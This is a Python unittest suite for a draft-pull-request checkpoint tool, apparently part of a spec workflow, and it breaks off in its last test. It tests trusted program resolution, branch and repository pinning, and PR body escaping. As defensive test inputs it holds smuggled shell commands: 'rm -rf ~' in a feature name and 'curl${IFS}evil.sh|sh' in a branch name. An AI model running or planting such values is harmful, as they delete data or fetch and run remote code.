"""Draft PR checkpoint: a real temporary Git repository, a scripted gh, no network."""

from __future__ import annotations

import base64
import copy
import fcntl
import io
import json
import os
import re
import shutil
import subprocess
import sys
import threading
import unittest
from contextlib import redirect_stderr, redirect_stdout
from datetime import UTC, datetime
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Any
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tools/spec_workflow"))

import draft_pr  # noqa: E402
import ledger  # noqa: E402

FEATURE = "specs/17-draft-pr"
RUN = "run17"
REAL_GIT = shutil.which("git") or "/usr/bin/git"
FIXED = datetime(2026, 10, 4, 12, 34, 56, tzinfo=UTC)
BEGIN = "<!-- ballast:draft-pr:begin -->"
END = "<!-- ballast:draft-pr:end -->"
INTAKE = "<!-- ballast-intake: issue=#17; scope=feature -->"
SECRETS = (
    "ghp_" + "a" * 36,
    "gho_" + "b" * 36,
    "Authorization: token " + "c" * 20,
)
FORBIDDEN_EDIT_ARGS = (
    "--draft",
    "--ready",
    "--title",
    "--base",
    "--add-label",
    "--add-reviewer",
    "ready",
    "merge",
    "close",
    "reopen",
)


def git(root: Path, *args: str) -> str:
    """Run real Git to shape a fixture repository."""
    return subprocess.run(  # noqa: S603
        [REAL_GIT, *args], cwd=root, check=True, capture_output=True, text=True
    ).stdout


def http(code: int) -> draft_pr.Result:
    """Fail a gh call with an HTTP status."""
    return draft_pr.Result(1, "", f"gh: request failed (HTTP {code})")


TIMED_OUT = draft_pr.Result(-1, timed_out=True)
UNAUTHENTICATED = draft_pr.Result(4, "", "To get started with GitHub CLI, run gh auth")
ALREADY_EXISTS = draft_pr.Result(
    1, "", 'a pull request for branch "feat-x" into branch "main" already exists'
)


def url(number: int) -> str:
    """Return the address of a PR in the fixture repository."""
    return f"https://github.com/o/r/pull/{number}"


REAL_TEMP_ROOTS = ledger.agent_temp_roots


def pull(  # noqa: PLR0913
    number: int,
    *,
    state: str = "open",
    draft: bool = True,
    base: str = "main",
    head: str = "feat-x",
    owner: str = "o",
    repo: str = "r",
    body: str = "",
    merged: bool = False,
    closed_at: str | None = None,
) -> dict[str, Any]:
    """One entry of GitHub's pulls list."""
    return {
        "number": number,
        "state": state,
        "draft": draft,
        "merged_at": "2026-10-01T00:00:00Z" if merged else None,
        "closed_at": closed_at,
        "base": {"ref": base},
        "head": {
            "ref": head,
            "repo": {
                "name": repo,
                "full_name": f"{owner}/{repo}",
                "owner": {"login": owner},
            },
        },
        "html_url": url(number),
        "body": body,
    }


def section(
    run: str = RUN, scope: list[str] | None = None, when: str = "2026-10-04T12:34:56Z"
) -> str:
    """Write out the canonical Ballast section from the contract."""
    lines = [
        BEGIN,
        "## Ballast",
        "",
        "Related to #17",
        "",
        f"- Feature: `{FEATURE}/`",
        f"- Run: `{run}`",
        f"- Last checkpoint: {when}",
    ]
    if scope:
        lines.append("- Scope:")
        lines.extend(f"  - {line}" for line in scope)
    else:
        lines.append("- Scope: no intake scope comment")
    lines.append(END)
    return "\n".join(lines)


def comment(body: str, created_at: str, association: str = "MEMBER") -> dict[str, Any]:
    """One Issue comment as the API lists it."""
    return {"body": body, "created_at": created_at, "author_association": association}


class TempRepo:
    """A feature checkout: `main`, a feature branch with upstream config, no push."""

    def __init__(self, root: Path) -> None:
        """Create the checkout and the run's inputs."""
        root.mkdir()
        self.root = root
        git(root, "init", "-q", "-b", "main")
        git(
            root,
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@example.test",
            "-c",
            "commit.gpgsign=false",
            "commit",
            "-q",
            "--allow-empty",
            "-m",
            "base",
        )
        git(root, "checkout", "-q", "-b", "feat-x")
        git(root, "remote", "add", "origin", "https://github.com/o/r.git")
        git(root, "config", "branch.feat-x.remote", "origin")
        git(root, "config", "branch.feat-x.merge", "refs/heads/feat-x")
        (root / "ballast.toml").write_text('[github]\nrepository = "o/r"\n')
        self.inputs(FEATURE)

    def inputs(self, feature: str) -> None:
        run = self.root / ".specify/workflows/runs" / RUN
        run.mkdir(parents=True, exist_ok=True)
        (run / "inputs.json").write_text(
            json.dumps(
                {"inputs": {"idea": "Issue #17: x", "feature_directory": feature}}
            )
        )


def executable(path: Path, text: str) -> Path:
    """Write an executable script."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    path.chmod(0o755)
    return path


class FakeGitHub:
    """The `_command` seam: real Git for the resolved git, scripted gh replies."""

    def __init__(self, gh: str, git_program: str) -> None:
        """Start with a repository, an Issue, a meaningful change and no PR."""
        self.gh = gh
        self.git = git_program
        self.lock = threading.Lock()
        self.calls: list[list[str]] = []
        self.stdins: list[tuple[list[str], str | None]] = []
        self.repo: dict[str, Any] = {"full_name": "o/r", "default_branch": "main"}
        self.issue: dict[str, Any] | None = {"number": 17, "title": "Draft PR"}
        self.comment_pages: list[list[dict[str, Any]]] = [[]]
        self.prs: list[dict[str, Any]] = []
        self.pr_pages: list[list[dict[str, Any]]] | None = None
        self.files: list[dict[str, Any]] | None = [{"filename": "src/x.py"}]
        self.template: str | None = None
        self.failures: dict[str, draft_pr.Result] = {}
        self.git_overrides: dict[str, draft_pr.Result] = {}
        self.on_create: Any = None
        self.on_pull: Any = None
        self.next_number = 42

    def __call__(
        self,
        argv: list[str],
        *,
        stdin: str | None = None,
        cwd: Path,
        root: Path | None = None,
    ) -> draft_pr.Result:
        assert Path(argv[0]).is_absolute(), argv  # noqa: S101
        if argv[0] == self.gh:
            # gh never starts inside the checkout, whose .git/config is agent-writable.
            assert root is not None  # noqa: S101
            assert not cwd.is_relative_to(root), cwd  # noqa: S101
        with self.lock:
            self.calls.append(list(argv))
            self.stdins.append((list(argv), stdin))
            if argv[0] == self.git:
                if argv[1] in self.git_overrides:
                    return self.git_overrides[argv[1]]
                result = subprocess.run(  # noqa: S603
                    [REAL_GIT, *argv[1:]],
                    cwd=cwd,
                    capture_output=True,
                    text=True,
                    check=False,
                )
                return draft_pr.Result(result.returncode, result.stdout, result.stderr)
            if argv[0] == self.gh:
                return self.serve(argv, stdin)
        message = f"unexpected program {argv[0]}"
        raise AssertionError(message)

    @staticmethod
    def stage(argv: list[str]) -> str:  # noqa: PLR0911
        """Name the checkpoint stage a gh argv belongs to."""
        if argv[1] == "pr":
            return argv[2]
        path = argv[-1]
        if "/pulls?" in path:
            return "pulls"
        if re.search(r"/pulls/[0-9]+$", path):
            return "pull"
        if path.endswith("/comments?per_page=100"):
            return "comments"
        if "/compare/" in path:
            return "compare"
        if "/contents/" in path:
            return "template"
        if "/issues/" in path:
            return "issue"
        return "repo"

    def serve(self, argv: list[str], stdin: str | None) -> draft_pr.Result:  # noqa: C901, PLR0911, PLR0912
        stage = self.stage(argv)
        if stage in {"pulls", "comments"}:
            assert argv[1:4] == ["api", "--paginate", "--slurp"], argv  # noqa: S101
        if stage in self.failures:
            return self.failures[stage]
        if stage == "repo":
            return self.ok(self.repo)
        if stage == "issue":
            return self.ok(self.issue) if self.issue is not None else http(404)
        if stage == "comments":
            return self.ok(self.comment_pages)
        if stage == "pulls":
            pages = self.pr_pages if self.pr_pages is not None else [self.prs]
            return self.ok(copy.deepcopy(pages))
        if stage == "pull":
            number = int(argv[-1].rsplit("/", 1)[1])
            if self.on_pull is not None:
                self.on_pull(number)
            for item in self.prs:
                if item["number"] == number:
                    return self.ok(copy.deepcopy(item))
            return http(404)
        if stage == "compare":
            if self.files is None:
                return http(404)
            # GitHub lists at most 300 files, on the first page only.
            return self.ok({"files": self.files[:300]})
        if stage == "template":
            if self.template is None:
                return http(404)
            content = base64.encodebytes(self.template.encode()).decode()
            return self.ok({"type": "file", "content": content})
        if stage == "create":
            if self.on_create is not None:
                return self.on_create(argv, stdin)
            number = self.next_number
            self.next_number += 1
            base = argv[argv.index("--base") + 1]
            head = argv[argv.index("--head") + 1]
            self.prs.append(pull(number, base=base, head=head, body=stdin or ""))
            return draft_pr.Result(0, url(number) + "\n")
        if stage == "edit":
            number = int(argv[3])
            for item in self.prs:
                if item["number"] == number:
                    item["body"] = stdin
            return draft_pr.Result(0)
        message = f"unexpected gh call {argv}"
        raise AssertionError(message)

    @staticmethod
    def ok(data: object) -> draft_pr.Result:
        return draft_pr.Result(0, json.dumps(data))

    def gh_calls(self, stage: str | None = None) -> list[list[str]]:
        return [
            argv
            for argv in self.calls
            if argv[0] == self.gh and (stage is None or self.stage(argv) == stage)
        ]

    def body_of(self, stage: str) -> str | None:
        bodies = [
            stdin
            for argv, stdin in self.stdins
            if argv[0] == self.gh and self.stage(argv) == stage
        ]
        return bodies[-1] if bodies else None


class CheckpointCase(unittest.TestCase):
    """A fresh checkout, trusted programs and fake GitHub for every test."""

    def setUp(self) -> None:
        self.temp = TemporaryDirectory()
        self.base = Path(self.temp.name).resolve()
        self.repo = TempRepo(self.base / "repo")
        self.trusted = self.base / "trusted"
        self.trusted.mkdir()
        (self.trusted / "git").symlink_to(REAL_GIT)
        executable(self.trusted / "gh", "#!/bin/sh\nexit 0\n")
        self.only_git = self.base / "only-git"
        self.only_git.mkdir()
        (self.only_git / "git").symlink_to(REAL_GIT)
        self.only_gh = self.base / "only-gh"
        executable(self.only_gh / "gh", "#!/bin/sh\nexit 0\n")
        self.sentinel = self.base / "checkout-program-ran"
        self.entries = [str(self.trusted)]
        self.fake = FakeGitHub(
            str((self.trusted / "gh").resolve()), str(Path(REAL_GIT).resolve())
        )
        for patcher in (
            patch.object(draft_pr, "_command", self.fake),
            patch.object(draft_pr, "_path_entries", lambda: list(self.entries)),
            patch.object(draft_pr, "_now", lambda: FIXED),
            patch.dict(os.environ, {"XDG_STATE_HOME": str(self.base / "state")}),
            patch.object(ledger, "agent_temp_roots", tuple),
        ):
            patcher.start()
            self.addCleanup(patcher.stop)
        draft_pr.pin_branch(self.repo.root, RUN)
        self.fake.calls.clear()
        self.fake.stdins.clear()

    def tearDown(self) -> None:
        self.temp.cleanup()

    def local_bin(self, *names: str) -> Path:
        """Create checkout-local programs that leave a sentinel when run."""
        directory = self.repo.root / "bin"
        for name in names:
            executable(directory / name, f"#!/bin/sh\ntouch {self.sentinel}\n")
        return directory

    def check(self) -> draft_pr.Outcome:
        return draft_pr.checkpoint(self.repo.root, RUN)

    def recorded(self) -> list[dict[str, Any]]:
        events, problems = ledger.read(self.repo.root, RUN)
        self.assertEqual(problems, [])
        return [event["data"] for event in events if event["kind"] == "pull_request"]

    def assertOutcome(  # noqa: N802
        self, outcome: draft_pr.Outcome, state: str, reason: str | None = None
    ) -> None:
        self.assertEqual((outcome.state, outcome.reason), (state, reason), outcome)

    def assertNoWrite(self) -> None:  # noqa: N802
        self.assertEqual(self.fake.gh_calls("create"), [])
        self.assertEqual(self.fake.gh_calls("edit"), [])


class ProgramResolutionTests(CheckpointCase):
    """FR-001, BL-INV-002, AC-010: only programs outside working trees run."""

    def test_checkout_local_gh_first_on_path_is_never_run(self) -> None:
        self.entries = [str(self.local_bin("gh")), str(self.trusted)]
        self.assertOutcome(self.check(), "created")
        trusted = str((self.trusted / "gh").resolve())
        self.assertTrue(self.fake.gh_calls())
        for argv in self.fake.calls:
            self.assertIn(argv[0], {trusted, self.fake.git})
        self.assertFalse(self.sentinel.exists())

    def test_gh_only_in_checkout_or_relative_entry_is_untrusted(self) -> None:
        self.entries = [str(self.local_bin("gh")), "relative-bin", str(self.only_git)]
        outcome = self.check()
        self.assertOutcome(outcome, "failed-retryable", "gh-untrusted")
        self.assertIn(
            "gh not found outside working trees", draft_pr.format_line(outcome)
        )
        self.assertEqual(self.fake.gh_calls(), [])
        self.assertFalse(self.sentinel.exists())

    def test_missing_gh_reports_install_remedy(self) -> None:
        self.entries = [str(self.only_git)]
        outcome = self.check()
        self.assertOutcome(outcome, "failed-retryable", "gh-missing")
        self.assertEqual(
            outcome.remedy, "install the GitHub CLI; ballast doctor checks it"
        )
        self.assertEqual(self.recorded()[-1]["reason"], "gh-missing")

    def test_git_only_in_checkout_is_untrusted(self) -> None:
        self.entries = [str(self.local_bin("git")), str(self.only_gh)]
        outcome = self.check()
        self.assertOutcome(outcome, "failed-retryable", "git-untrusted")
        self.assertIn(
            "git not found outside working trees", draft_pr.format_line(outcome)
        )
        self.assertEqual(self.fake.calls, [])
        self.assertFalse(self.sentinel.exists())

    def test_tamper_or_in_progress_marker_skips_without_command_or_event(self) -> None:
        state = draft_pr.state_dir(self.repo.root)
        for marker, path in (
            ("BALLAST_TAMPERED", self.repo.root / "BALLAST_TAMPERED"),
            ("in-progress", state / "in-progress"),
        ):
            with self.subTest(marker=marker):
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text("x\n")
                outcome = self.check()
                self.assertEqual(outcome.state, "skipped")
                self.assertEqual(
                    draft_pr.format_line(outcome),
                    f"Draft PR: skipped: {marker} exists; restore the checkout",
                )
                self.assertEqual(self.fake.calls, [])
                self.assertFalse(ledger.ledger_path(self.repo.root, RUN).exists())
                path.unlink()


class IdentityTests(CheckpointCase):
    """AC-003, AC-006, AC-013, FR-012 and the identity edge cases."""

    def test_feature_without_issue_number_is_unlinked_before_any_command(self) -> None:
        for feature in ("specs/draft-pr", "specs/17-x;rm -rf ~"):
            with self.subTest(feature=feature):
                self.repo.inputs(feature)
                self.assertOutcome(self.check(), "blocked-unlinked", "no-issue-number")
                self.assertEqual(self.fake.calls, [])

    def test_detached_head_is_pending_no_branch(self) -> None:
        git(self.repo.root, "checkout", "-q", "--detach")
        self.assertOutcome(self.check(), "pending", "no-branch")
        self.assertEqual(self.fake.gh_calls(), [])

    def test_dash_branch_name_is_refused_before_any_gh_call(self) -> None:
        self.fake.git_overrides["symbolic-ref"] = draft_pr.Result(0, "--help\n")
        self.assertOutcome(self.check(), "pending", "no-branch")
        self.assertEqual(self.fake.gh_calls(), [])

    def test_branch_without_upstream_is_not_published(self) -> None:
        git(self.repo.root, "config", "--unset", "branch.feat-x.merge")
        outcome = self.check()
        self.assertOutcome(outcome, "pending", "not-published")
        self.assertEqual(
            outcome.remedy, "publish the branch, e.g. git push -u origin feat-x"
        )
        self.assertNoWrite()
        self.assertEqual(
            self.recorded()[-1],
            {"outcome": "pending", "reason": "not-published", "issue": 17},
        )

    def test_upstream_under_another_name_is_refused(self) -> None:
        # DEC-0010: the upstream name lives in agent-writable .git/config even
        # at start, so the branch must be published under its own name.
        git(self.repo.root, "config", "branch.feat-x.merge", "refs/heads/other-name")
        draft_pr.pin_branch(self.repo.root, RUN)
        outcome = self.check()
        # Not published under its own name: push it there (live check: a
        # worktree branch created from origin/main tracks main).
        self.assertOutcome(outcome, "pending", "not-published")
        self.assertIn("git push -u origin feat-x", outcome.remedy)
        self.assertEqual(self.fake.gh_calls(), [])

    def test_run_without_a_branch_pin_is_unlinked(self) -> None:
        # DEC-0006: a run started before the pin existed, or whose pin failed.
        draft_pr._pin_path(self.repo.root, RUN).unlink()  # noqa: SLF001
        outcome = self.check()
        self.assertOutcome(outcome, "blocked-unlinked", "branch-unpinned")
        self.assertEqual(self.fake.gh_calls(), [])

    def test_branch_switched_after_start_is_refused(self) -> None:
        # DEC-0006: HEAD and its upstream live in agent-writable Git state.
        git(self.repo.root, "checkout", "-q", "-b", "victim")
        git(self.repo.root, "config", "branch.victim.remote", "origin")
        git(self.repo.root, "config", "branch.victim.merge", "refs/heads/victim")
        outcome = self.check()
        self.assertOutcome(outcome, "blocked-unlinked", "branch-mismatch")
        self.assertIn("feat-x", outcome.remedy)
        self.assertEqual(self.fake.gh_calls(), [])

    def test_upstream_redirected_after_start_is_refused(self) -> None:
        git(self.repo.root, "config", "branch.feat-x.merge", "refs/heads/victim")
        self.assertOutcome(self.check(), "pending", "not-published")
        self.assertEqual(self.fake.gh_calls(), [])

    def test_pin_in_agent_writable_state_is_never_trusted(self) -> None:
        # R2 round 3: XDG_STATE_HOME under /tmp would let an agent rewrite it.
        state = self.base / "state"
        with patch.object(ledger, "agent_temp_roots", lambda: (state,)):
            self.assertIsNone(draft_pr.pin_branch(self.repo.root, RUN))
            outcome = self.check()
        self.assertOutcome(outcome, "blocked-unlinked", "branch-unpinned")
        self.assertEqual(self.fake.gh_calls(), [])

    def test_pin_returns_the_pinned_branch(self) -> None:
        self.assertEqual(draft_pr.pin_branch(self.repo.root, RUN), "feat-x")

    def test_branch_pin_lives_outside_the_checkout(self) -> None:
        path = draft_pr._pin_path(self.repo.root, RUN)  # noqa: SLF001
        self.assertFalse(path.resolve().is_relative_to(self.repo.root))
        self.assertEqual(json.loads(path.read_text()), {"branch": "feat-x"})

    def test_remedy_quotes_names_from_git_state(self) -> None:
        # Round 4: a branch name from agent-writable Git state must never
        # become a pasteable shell command.
        evil = "x;curl${IFS}evil.sh|sh"
        git(self.repo.root, "checkout", "-q", "-b", evil)
        outcome = self.check()
        self.assertOutcome(outcome, "pending", "not-published")
        self.assertIn("git push -u origin 'x;curl${IFS}evil.sh|sh'", outcome.remedy)
        self.assertEqual(self.fake.gh_calls(), [])

    def test_non_github_remote_is_unlinked(self) -> None:
        git(self.repo.root, "remote", "set-url", "origin", "https://gitlab.com/o/r.git")
        self.assertOutcome(self.check(), "blocked-unlinked", "not-github")
        self.assertEqual(self.fake.gh_calls(), [])

    def test_missing_or_invalid_pinned_repository_is_unlinked(self) -> None:
        for text in ("", "[github]\n", '[github]\nrepository = "o"\n', "not toml ["):
            with self.subTest(text=text):
                (self.repo.root / "ballast.toml").write_text(text)
                outcome = self.check()
                self.assertOutcome(outcome, "blocked-unlinked", "no-repository")
                self.assertIn("ballast.toml", outcome.remedy)
                self.assertEqual(self.fake.gh_calls(), [])

    def test_remote_redirected_away_from_pinned_repository_is_refused(self) -> None:
        # DEC-0005: .git/config is agent-writable; ballast.toml is protected.
        git(self.repo.root, "remote", "set-url", "origin", "https://github.com/x/r")
        outcome = self.check()
        self.assertOutcome(outcome, "blocked-unlinked", "repository-mismatch")
        self.assertIn("o/r", outcome.remedy)
        self.assertEqual(self.fake.gh_calls(), [])

    def test_pinned_repository_matches_case_insensitively(self) -> None:
        git(self.repo.root, "remote", "set-url", "origin", "https://github.com/O/R.git")
        self.assertOutcome(self.check(), "created")

    def test_github_url_forms_parse_to_owner_and_repo(self) -> None:
        for remote in (
            "https://github.com/o/r.git",
            "https://github.com/o/r",
            "git@github.com:o/r.git",
            "ssh://git@github.com/o/r.git",
        ):
            with self.subTest(remote=remote):
                git(self.repo.root, "remote", "set-url", "origin", remote)
                self.fake.prs.clear()
                self.assertOutcome(self.check(), "created")
                create = self.fake.gh_calls("create")[-1]
                self.assertEqual(create[create.index("--repo") + 1], "o/r")

    def test_repository_lookup_failure_never_guesses_a_base(self) -> None:
        for result, reason in (
            (http(502), "github-error"),
            (http(404), "gh-forbidden"),
        ):
            with self.subTest(reason=reason):
                self.fake.failures["repo"] = result
                self.assertOutcome(self.check(), "failed-retryable", reason)
                self.assertNoWrite()

    def test_published_branch_equal_to_default_branch_is_pending(self) -> None:
        self.fake.repo["default_branch"] = "feat-x"
        self.assertOutcome(self.check(), "pending", "on-base-branch")
        self.assertNoWrite()

    def test_missing_issue_or_pull_request_number_is_unlinked(self) -> None:
        for issue in (None, {"number": 17, "title": "t", "pull_request": {}}):
            with self.subTest(issue=issue):
                self.fake.issue = issue
                self.assertOutcome(self.check(), "blocked-unlinked", "issue-not-found")
                self.assertNoWrite()

    def test_resume_reads_feature_from_run_inputs(self) -> None:
        self.assertOutcome(self.check(), "created")
        events, _ = ledger.read(self.repo.root, RUN)
        self.assertEqual(events[-1]["feature"], FEATURE)
        self.assertIn(f"- Feature: `{FEATURE}/`", self.fake.body_of("create"))

    def test_git_commands_only_read(self) -> None:
        self.check()
        subcommands = {argv[1] for argv in self.fake.calls if argv[0] == self.fake.git}
        self.assertLessEqual(
            subcommands, {"symbolic-ref", "for-each-ref", "remote", "rev-parse"}
        )
        remote = [argv for argv in self.fake.calls if argv[1:2] == ["remote"]]
        self.assertTrue(all(argv[2] == "get-url" for argv in remote))


class CreationTests(CheckpointCase):
    """US1: AC-001, AC-002, FR-006."""

    def test_meaningful_change_without_pr_creates_one_draft(self) -> None:
        outcome = self.check()
        self.assertOutcome(outcome, "created")
        (create,) = self.fake.gh_calls("create")
        self.assertEqual(
            create,
            [
                self.fake.gh,
                "pr",
                "create",
                "--repo",
                "o/r",
                "--draft",
                "--base",
                "main",
                "--head",
                "feat-x",
                "--title",
                "Draft PR",
                "--body-file",
                "-",
            ],
        )
        body = self.fake.body_of("create")
        self.assertEqual(body, section())
        for keyword in ("Closes", "Fixes", "Resolves", "closes", "fixes", "resolves"):
            self.assertNotIn(keyword, body)
        self.assertEqual(
            draft_pr.format_line(outcome),
            "Draft PR: created #42 https://github.com/o/r/pull/42",
        )
        self.assertEqual(
            self.recorded()[-1],
            {"outcome": "created", "issue": 17, "pr_number": 42, "pr_url": url(42)},
        )

    def test_long_issue_title_is_truncated(self) -> None:
        self.fake.issue = {"number": 17, "title": "t" * 300}
        self.check()
        create = self.fake.gh_calls("create")[0]
        self.assertEqual(create[create.index("--title") + 1], "t" * 256)

    def test_cross_repository_pr_with_same_head_is_ignored(self) -> None:
        self.fake.prs.append(pull(5, owner="fork"))
        self.assertOutcome(self.check(), "created")
        self.assertEqual(len(self.fake.gh_calls("create")), 1)

    def test_pr_from_another_repository_of_the_same_owner_is_ignored(self) -> None:
        # R2 review: the owner alone does not identify the head repository.
        self.fake.prs.append(pull(5, repo="other", body="Related to #17"))
        self.assertOutcome(self.check(), "created")
        self.assertEqual(self.fake.gh_calls("edit"), [])

    def test_head_repository_matches_case_insensitively(self) -> None:
        self.fake.prs.append(pull(5, owner="O", repo="R", body=section()))
        self.assertOutcome(self.check(), "reused")


class PendingTests(CheckpointCase):
    """AC-003, AC-004, AC-005, FR-003: no PR before a meaningful published change."""

    def test_head_missing_on_github_is_not_published(self) -> None:
        self.fake.files = None
        outcome = self.check()
        self.assertOutcome(outcome, "pending", "not-published")
        self.assertIn("git push -u origin feat-x", outcome.remedy)
        self.assertNoWrite()

    def test_malformed_list_is_retryable_never_empty(self) -> None:
        # Reconciliation gap 3: an unreadable PR list read as "no PR" and
        # allowed a second PR; unreadable comments silently dropped the scope.
        for stage in ("pulls", "comments"):
            for result in (
                draft_pr.Result(0, "not json"),
                draft_pr.Result(0, '{"message": "x"}'),
                draft_pr.Result(0, '[{"number": 1}]'),
            ):
                with self.subTest(stage=stage, stdout=result.stdout):
                    self.fake.failures.clear()
                    self.fake.failures[stage] = result
                    self.assertOutcome(self.check(), "failed-retryable", "github-error")
                    self.assertNoWrite()

    def test_malformed_compare_is_retryable_not_empty(self) -> None:
        # R2 round 3: an unreadable compare must never read as "no change".
        for result in (
            draft_pr.Result(0, "not json"),
            draft_pr.Result(0, '{"status": "ahead"}'),
            draft_pr.Result(0, '{"files": "x"}'),
        ):
            with self.subTest(stdout=result.stdout):
                self.fake.failures["compare"] = result
                self.assertOutcome(self.check(), "failed-retryable", "github-error")
                self.assertNoWrite()

    def test_spec_only_or_empty_differences_are_not_meaningful(self) -> None:
        for files in (
            [],
            [{"filename": f"{FEATURE}/spec.md"}],
            [
                {
                    "filename": f"{FEATURE}/plan.md",
                    "previous_filename": f"{FEATURE}/old.md",
                }
            ],
        ):
            with self.subTest(files=files):
                self.fake.files = files
                self.assertOutcome(self.check(), "pending", "no-meaningful-change")
                self.assertNoWrite()

    def test_paths_outside_the_exact_spec_prefix_are_meaningful(self) -> None:
        for files in (
            [{"filename": "specs/17-draft-prx/spec.md"}],
            [{"filename": "specs/other/spec.md"}],
            [{"filename": "src/new.py", "previous_filename": f"{FEATURE}/new.py"}],
            [{"filename": f"{FEATURE}/moved.py", "previous_filename": "src/moved.py"}],
        ):
            with self.subTest(files=files):
                self.fake.prs.clear()
                self.fake.files = files
                self.assertOutcome(self.check(), "created")

    def test_capped_spec_only_list_is_unclassified(self) -> None:
        # DEC-0008 superseded: GitHub's compare lists at most 300 files, on its
        # first page only; a later file can never be seen, so never conclude.
        self.fake.files = [{"filename": f"{FEATURE}/f{i}.md"} for i in range(450)]
        self.fake.files.append({"filename": "src/late.py"})
        self.assertOutcome(self.check(), "pending", "diff-unclassified")
        self.assertNoWrite()
        compare = self.fake.gh_calls("compare")[0]
        self.assertNotIn("--paginate", compare)


class BodyTests(CheckpointCase):
    """FR-016: base-branch template, intake scope lines, escaping."""

    def test_base_branch_template_precedes_the_section(self) -> None:
        self.fake.template = "## Summary\n\nDescribe the change.\n"
        local = self.repo.root / ".github/pull_request_template.md"
        local.parent.mkdir()
        local.write_text("CHECKOUT TEMPLATE\n")
        self.assertOutcome(self.check(), "created")
        body = self.fake.body_of("create")
        self.assertEqual(body, self.fake.template + "\n" + section())
        self.assertNotIn("CHECKOUT TEMPLATE", body)
        self.assertIn("ref=main", self.fake.gh_calls("template")[0][-1])

    def test_missing_template_leaves_only_the_section(self) -> None:
        self.assertOutcome(self.check(), "created")
        self.assertEqual(self.fake.body_of("create"), section())

    def test_template_failure_is_retryable_and_creates_nothing(self) -> None:
        self.fake.failures["template"] = http(502)
        self.assertOutcome(self.check(), "failed-retryable", "github-error")
        self.assertNoWrite()

    def test_intake_scope_lines_are_copied(self) -> None:
        self.fake.comment_pages = [
            [
                comment(
                    "Scope gate: leaf\nMain outcome: one Draft PR\nIn scope: x\n"
                    f"Risk: R2\n\n{INTAKE}\n",
                    "2026-10-01T00:00:00Z",
                )
            ]
        ]
        self.check()
        self.assertEqual(
            self.fake.body_of("create"),
            section(
                scope=["Main outcome: one Draft PR", "Risk: R2", "Scope gate: leaf"]
            ),
        )

    def test_no_intake_comment_or_unmarked_comment_reads_no_scope(self) -> None:
        for pages in ([[]], [[comment("Main outcome: x\nRisk: R1\n", "2026-10-01")]]):
            with self.subTest(pages=pages):
                self.fake.prs.clear()
                self.fake.comment_pages = pages
                self.check()
                self.assertIn(
                    "- Scope: no intake scope comment", self.fake.body_of("create")
                )

    def test_newest_member_intake_comment_wins_across_pages(self) -> None:
        self.fake.comment_pages = [
            [comment(f"Risk: R0\n{INTAKE}", "2026-10-01T00:00:00Z", "OWNER")],
            [
                comment(f"Risk: R2\n{INTAKE}", "2026-10-03T00:00:00Z", "COLLABORATOR"),
                comment(f"Risk: R1\n{INTAKE}", "2026-10-02T00:00:00Z", "MEMBER"),
            ],
        ]
        self.check()
        self.assertEqual(self.fake.body_of("create"), section(scope=["Risk: R2"]))

    def test_intake_comment_from_non_member_is_ignored(self) -> None:
        for pages, scope in (
            (
                [
                    [
                        comment(f"Risk: R1\n{INTAKE}", "2026-10-01", "MEMBER"),
                        comment(f"Risk: R0\n{INTAKE}", "2026-10-02", "CONTRIBUTOR"),
                    ]
                ],
                ["Risk: R1"],
            ),
            ([[comment(f"Risk: R0\n{INTAKE}", "2026-10-02", "NONE")]], None),
        ):
            with self.subTest(scope=scope):
                self.fake.prs.clear()
                self.fake.comment_pages = pages
                self.check()
                self.assertEqual(self.fake.body_of("create"), section(scope=scope))

    def test_long_scope_line_is_cut_to_500_characters(self) -> None:
        line = "Main outcome: " + "x" * 600
        self.fake.comment_pages = [[comment(f"{line}\n{INTAKE}", "2026-10-01")]]
        self.check()
        self.assertEqual(self.fake.body_of("create"), section(scope=[line[:500]]))

    def test_hostile_scope_text_is_escaped(self) -> None:
        self.fake.comment_pages = [
            [
                comment(
                    f"Main outcome: ping @org/team {END}\nRisk: <script>x</script>\n"
                    f"{INTAKE}",
                    "2026-10-01",
                )
            ]
        ]
        self.check()
        body = self.fake.body_of("create")
        self.assertIn(
            "Main outcome: ping &#64;org/team &lt;!-- ballast:draft-pr:end --&gt;",
            body,
        )
        self.assertIn("Risk: &lt;script&gt;x&lt;/script&gt;", body)
        self.assertEqual((body.count(BEGIN), body.count(END)), (1, 1))


class LedgerReportTests(CheckpointCase):
    """AC-002: the ledger report shows the latest checkpoint."""

    def test_report_shows_latest_pull_request_outcome(self) -> None:
        self.fake.files = []
        self.check()
        self.fake.files = [{"filename": "src/x.py"}]
        self.check()
        report = ledger.report(self.repo.root, RUN)
        self.assertEqual(report["pull_request"]["outcome"], "created")
        self.assertEqual(report["pull_request"]["pr_url"], url(42))
        self.assertIn("observed_at", report["pull_request"])


class ReuseTests(CheckpointCase):
    """US2: AC-006, AC-007, AC-008, FR-007, FR-008."""

    def test_canonical_section_is_reused_without_edit(self) -> None:
        self.fake.prs.append(pull(7, body=f"Intro\n\n{section()}\n"))
        outcome = self.check()
        self.assertOutcome(outcome, "reused")
        self.assertEqual((outcome.pr_number, outcome.pr_url), (7, url(7)))
        self.assertNoWrite()
        self.assertEqual(
            self.recorded()[-1],
            {"outcome": "reused", "issue": 17, "pr_number": 7, "pr_url": url(7)},
        )

    def test_stale_section_is_rewritten_and_nothing_else(self) -> None:
        before = "## Template\n\nHuman text before.\n\n"
        after = "\n\nHuman text after.\r\n"
        for old in (section(run="other"), section(when="2026-10-01T00:00:00Z")):
            with self.subTest(old=old[-80:]):
                self.fake.calls.clear()
                self.fake.stdins.clear()
                self.fake.prs[:] = [pull(7, body=before + old + after)]
                self.assertOutcome(self.check(), "reused")
                (edit,) = self.fake.gh_calls("edit")
                self.assertEqual(
                    edit,
                    [
                        self.fake.gh,
                        "pr",
                        "edit",
                        "7",
                        "--repo",
                        "o/r",
                        "--body-file",
                        "-",
                    ],
                )
                self.assertEqual(self.fake.body_of("edit"), before + section() + after)
                self.assertEqual(self.fake.gh_calls("create"), [])

    def test_hand_opened_pr_without_reference_gets_the_section(self) -> None:
        self.fake.prs.append(pull(9, draft=False, body="Opened by hand."))
        self.assertOutcome(self.check(), "reused")
        self.assertEqual(self.fake.body_of("edit"), "Opened by hand.\n\n" + section())

    def test_body_edited_during_the_check_is_left_alone(self) -> None:
        # DEC-0007: no conditional update exists; re-read and skip on change.
        self.fake.prs.append(pull(9, draft=False, body="Opened by hand."))

